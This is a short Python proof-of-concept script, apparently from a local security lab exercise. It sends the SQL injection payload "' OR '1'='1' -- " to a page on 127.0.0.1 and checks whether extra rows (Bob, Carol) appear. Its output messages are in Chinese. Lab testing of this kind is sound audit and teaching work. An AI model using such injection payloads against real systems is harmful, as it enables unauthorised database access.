#!/usr/bin/env python3
import urllib.parse
import urllib.request

URL = "http://127.0.0.1:4280/lab_cases/S001/index.php"
TIMEOUT = 5


def fetch(name):
    query = urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(
        URL + "?" + query,
        headers={"User-Agent": "S001-local-audit-poc"},
    )
    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body


def main():
    normal_name = "Alice"
    test_name = "' OR '1'='1' -- "

    print("[*] 目标:", URL)
    print("[*] 普通对照 name =", repr(normal_name))
    status_normal, body_normal = fetch(normal_name)
    print("[*] 普通对照 HTTP 状态:", status_normal)
    print("[*] 普通对照正文片段:")
    print(body_normal[:500])

    print("\n[*] 测试输入 name =", repr(test_name))
    status_test, body_test = fetch(test_name)
    print("[*] 测试输入 HTTP 状态:", status_test)
    print("[*] 测试输入正文片段:")
    print(body_test[:800])

    normal_has_alice = "Alice" in body_normal
    normal_has_bob = "Bob" in body_normal
    normal_has_carol = "Carol" in body_normal
    test_has_bob = "Bob" in body_test
    test_has_carol = "Carol" in body_test

    print("\n[实际观察]")
    print("普通对照包含 Alice:", normal_has_alice)
    print("普通对照包含 Bob:", normal_has_bob)
    print("普通对照包含 Carol:", normal_has_carol)
    print("测试输入包含 Bob:", test_has_bob)
    print("测试输入包含 Carol:", test_has_carol)

    if normal_has_alice and not normal_has_bob and not normal_has_carol and test_has_bob and test_has_carol:
        print("观察结果与SQL注入路径的预期一致：测试输入改变了查询结果集合。")
    else:
        print("未观察到预期差异。请检查服务、路径、数据库预置数据、连接文件和错误日志；不要仅凭 HTTP 200 判断成功。")


if __name__ == "__main__":
    main()
